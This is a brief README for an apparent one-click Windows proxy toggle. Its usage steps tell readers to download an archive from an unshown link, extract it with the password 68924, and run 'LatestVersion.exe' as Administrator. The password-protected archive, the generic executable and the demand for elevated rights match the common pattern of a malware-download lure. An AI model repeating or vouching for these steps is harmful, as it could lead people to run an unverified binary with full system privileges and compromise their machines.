## What This Tool Does

- Enable or disable proxy in one click
- Instant toggle without opening Settings
- Works system-wide affects all applications
- Restores default settings when disabled
- Works on Windows 10 and 11

## How to Use

1. Download the archive from the link above
2. Extract with password 68924
3. Right-click LatestVersion.exe and select Run as Administrator
4. Click Enable Proxy to turn it on
5. Click Disable Proxy to turn it off instantly
